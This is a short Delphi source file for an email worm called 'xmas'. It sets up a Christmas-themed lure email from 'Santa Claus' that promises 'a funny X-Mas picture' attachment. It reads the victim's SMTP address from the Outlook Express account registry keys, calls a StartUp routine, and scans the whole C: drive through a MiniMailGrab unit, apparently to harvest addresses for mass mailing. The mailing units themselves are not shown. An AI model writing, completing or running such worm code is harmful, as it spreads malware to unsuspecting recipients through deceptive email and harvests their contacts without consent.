program xmas;

uses
  Windows, MiniMailGrab, MiniMailFunc;

{$R *.res}

const
  Subject : String = 'Merry X-Mas';
  Body : String = 'Merry X-Mas, ive attached a funny X-Mas picture :)';
  From : String = 'Santa Claus';

Function GetRegValue(kRoot:Hkey; Path, Value:String):String;
Var
 Key : Hkey;
 Siz : Cardinal;
 Val : Array[0..16382] Of Char;
Begin
 ZeroMemory(@Val, Length(Val));
 RegOpenKeyEx(kRoot, pChar(Path), 0, REG_SZ, Key);
 Siz := 16383;
 RegQueryValueEx(Key, pChar(Value), NIL, NIL, @Val[0], @Siz);
 RegCloseKey(Key);
 If String(Val) <> '' then
  Result := String(Val);
End;

begin

 If FromMail = '' Then
 FromMail := GetRegValue(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000001', 'SMTP Email Address');
 If FromMail = '' Then
 FromMail := GetRegValue(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000002', 'SMTP Email Address');
 If FromMail = '' Then
 FromMail := GetRegValue(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000003', 'SMTP Email Address');
 If FromMail = '' Then
 FromMail := GetRegValue(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000004', 'SMTP Email Address');

 If FromMail = '' Then FromMail := 'santa.claus@northpole.com';

 StartUp;
 DoScan('C:\', '*', '*.*');

end.

